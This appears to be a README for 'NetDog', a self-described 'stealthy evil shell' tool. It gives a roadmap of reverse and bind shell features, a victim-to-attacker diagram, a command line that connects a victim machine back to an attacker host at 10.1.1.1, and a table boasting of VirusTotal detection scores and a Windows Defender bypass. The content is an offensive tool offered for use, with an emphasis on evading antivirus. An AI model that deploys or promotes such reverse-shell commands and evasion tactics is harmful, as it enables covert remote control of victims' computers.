# NetDog
Mini Stealthy Evil Shell

## Roadmap
- Reverse Shell
    - [x] TCP
    - [ ] UDP
    - [ ] HTTP/S
    - [ ] ICMP
- Bind Shell
    - [x] TCP
    - [x] UDP
- Others
    - [ ] IPv6
    - [ ] Encryption
    - [x] Auto reconnect
    - [ ] SSH backdoor server

## Choosing binary
- Always choose the one without upx
- There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)

## Reverse shell
```
+------------+            +------------+
|            |            |            |
|   victim   +------------>  attacker  |
|  (netdog)  |            |  10.1.1.1  |
|            |            |            |
+------------+            +------------+
```
```bash
./nd -host 10.1.1.1 # connect to attacker port 1234
```

## AV status
| type | size | score | windows defender |
| - | - | -| - |
|without upx | 2.2 MB|[4/69](https://www.virustotal.com/gui/file/b042c2498ab6ee36ce998842d4ed4592d46f55026677f1f6e750edf7b6a2411d/detection)| pass|
|with upx | 663 KB|[6/69](https://www.virustotal.com/gui/file/b6f9b09b20cda55d3e87d4f3c74971bffa65781c297ea4742c5987cc69b9b391/detection)| not pass|